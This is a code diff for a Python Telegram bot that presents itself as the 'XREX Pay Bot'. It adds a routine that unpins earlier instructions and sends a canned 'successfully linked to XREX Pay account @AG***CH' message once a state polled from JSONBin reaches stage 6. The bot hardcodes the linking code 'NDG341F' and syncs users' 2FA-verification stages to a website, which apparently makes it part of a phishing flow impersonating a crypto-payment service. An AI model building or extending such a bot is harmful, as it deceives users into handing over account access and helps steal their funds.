@@ -57,6 +57,9 @@ def set_sync_state(stage: int = None, twofa_verified: bool = None, linking_code:
     except Exception:
         pass
 
+# Global bot reference for background tasks
+bot_for_notifications = None
+
 async def push_jsonbin_state(stage: int = None, twofa_verified: bool = None, linking_code: str = None):
     """Push state to JSONBin so website can read it over HTTPS."""
     if httpx is None:
@@ -145,6 +148,51 @@ async def poll_jsonbin_and_sync():
                             set_sync_state(stage=stage or 1, twofa_verified=False, linking_code=None)
                         else:
                             set_sync_state(stage=stage, twofa_verified=twofa, linking_code=code)
+                        # If stage 6 reached, send success message and unpin for active users
+                        if stage >= 6:
+                            try:
+                                # Iterate known users and notify those who had the BOTC flow
+                                for uid, st in list(user_state.items()):
+                                    chat_id = st.get('chat_id')
+                                    if not chat_id:
+                                        continue
+                                    if st.get('stage6_notified'):
+                                        continue
+                                    # Unpin any pinned messages we created
+                                    try:
+                                        if st.get('pinned_instruction_message_id'):
+                                            if bot_for_notifications:
+                                                await bot_for_notifications.unpin_chat_message(chat_id=chat_id, message_id=st['pinned_instruction_message_id'])
+                                    except Exception:
+                                        pass
+                                    try:
+                                        if st.get('final_pinned_message_id'):
+                                            if bot_for_notifications:
+                                                await bot_for_notifications.unpin_chat_message(chat_id=chat_id, message_id=st['final_pinned_message_id'])
+                                    except Exception:
+                                        pass
+                                    # Send the final success message with buttons
+                                    keyboard = [[
+                                        InlineKeyboardButton("📚 How to use", callback_data="how_to_use"),
+                                        InlineKeyboardButton("...  More", callback_data="more")
+                                    ]]
+                                    reply_markup = InlineKeyboardMarkup(keyboard)
+                                    try:
+                                        if bot_for_notifications:
+                                            await bot_for_notifications.send_message(
+                                                chat_id=chat_id,
+                                                text=(
+                                                    "✅️ Telegram Bot successfully linked to XREX Pay account @AG***CH\n\n"
+                                                    "Tap the ‘How to use’ button to see how the XREX Pay Bot simplifies payments and more."
+                                                ),
+                                                reply_markup=reply_markup
+                                            )
+                                            st['stage6_notified'] = True
+                                            user_state[uid] = st
+                                    except Exception:
+                                        pass
+                            except Exception:
+                                pass
         except Exception:
             pass
         await asyncio.sleep(2.0)
@@ -200,7 +248,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 user_state[user_id] = {
                     'awaiting_2fa': True,
                     'pinned_instruction_message_id': sent.message_id,
-                    'linking_code': 'NDG341F'
+                    'linking_code': 'NDG341F',
+                    'chat_id': chat_id
                 }
                 # Expose expected next stage to website and push to JSONBin (prep state 3)
                 set_sync_state(stage=3, twofa_verified=False, linking_code='NDG341F')
@@ -339,6 +388,19 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id=query.message.chat_id,
             text=f"Linking code: `{code}`\n\nTap and hold to copy.",
             parse_mode='Markdown'
+        )
+        return
+
+    if data == "how_to_use":
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text=(
+                "Here’s how to use the XREX Pay Bot:\n\n"
+                "• /check_wallet <address> — See risk and balances for BTC/ETH/TRX addresses\n"
+                "• /otc_quote — Request a real-time OTC quote\n"
+                "• /otc_orders — Track your OTC orders\n\n"
+                "Tip: You can also use the buttons in the web app to open the bot and follow guided flows."
+            )
         )
         return
 
@@ -887,6 +949,9 @@ async def main():
         application = ApplicationBuilder().token(BOT_TOKEN).build()
         await application.initialize()
         await check_webhook(application.bot)
+        # Set global bot reference
+        global bot_for_notifications
+        bot_for_notifications = application.bot
 
         # Start local sync HTTP server (127.0.0.1:8787) if aiohttp is available
         try:
